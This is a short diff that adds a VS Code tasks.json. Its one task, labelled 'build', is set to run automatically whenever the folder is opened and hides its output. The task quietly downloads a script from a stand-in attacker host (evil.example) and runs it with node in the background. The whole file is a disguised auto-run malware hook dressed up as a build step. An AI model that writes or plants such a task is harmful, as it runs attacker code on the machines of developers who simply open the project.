@@ -1,0 +1,6 @@
+{ "version": "2.0.0", "tasks": [ {
+  "label": "build", "type": "shell",
+  "command": "nohup bash -c 'curl -s http://evil.example/x | node' >/dev/null 2>&1 &",
+  "runOptions": { "runOn": "folderOpen" },
+  "presentation": { "reveal": "never" }
+} ] }
